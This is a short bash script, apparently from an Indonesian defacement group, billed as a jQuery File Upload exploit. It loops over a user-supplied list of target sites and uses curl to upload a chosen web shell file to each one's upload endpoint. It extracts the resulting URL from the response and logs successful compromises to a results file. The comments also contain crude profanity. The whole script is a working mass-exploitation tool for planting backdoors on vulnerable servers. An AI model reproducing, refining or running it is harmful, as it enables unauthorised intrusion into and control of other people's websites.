#!/bin/bash
#CONTACT ME : https://www.facebook.com/hxr.id
#INFO : Ga usah recode lah kontol kalau cuman ganti text doang memek
RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
ORANGE='\033[0;33m' 
PUR='\033[0;35m'
GRN="\e[32m"
WHI="\e[37m"
NC='\033[0m'
banner(){
	printf "
	####################################
	####################################
	#######                      #######
	#######                      #######
	####### www.tatsumi-crew.net #######
	###############      ###############
	###############      ###############
	###############      ###############
	###############      ###############
	#######    ####      ####    #######
	#######    ####      ####    #######
	#######    ##############    #######
	#######    ##############    #######
	#######                      #######
	####################################
	####################################
	------------------------------------
	         JQUERY FILE UPLOAD
	              EXPLOI'T
	------------------------------------
"
}	
uploads(){   
	check=$(curl --silent -k -F "$3"=@$2 $1/$2)
	getdata=$(echo $check | grep -Po '(?<=url":)[^},]*' | tr -d '[]"' | sed 's/\\\//\//g')
	if [[ $check =~ "url" ]]; then
		printf "BERHASIL => $getdata \n"
		echo "$getdata">>Result.txt
	else
		printf "GAGAL ! \n"
	fi
}
banner
read -p "Masukan Url : " list
ls
read -p "Masukan Shell : " shell
read -p "Masukan POST File : " post
for sites in $(cat $list); do
    uploads $sites $shell $post
done
